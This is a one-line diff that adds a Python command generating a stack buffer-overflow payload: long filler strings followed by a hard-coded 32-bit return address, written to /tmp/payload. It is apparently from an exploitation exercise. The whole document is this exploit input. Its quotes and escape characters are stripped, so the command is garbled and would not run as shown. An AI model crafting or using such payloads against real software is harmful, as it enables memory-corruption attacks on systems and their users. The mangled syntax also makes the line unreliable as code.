@@ -1,0 +1,1 @@
+python -c 'print a*4095 + n + b* 14 + x64xe9xffxbf  + cn' > /tmp/payload
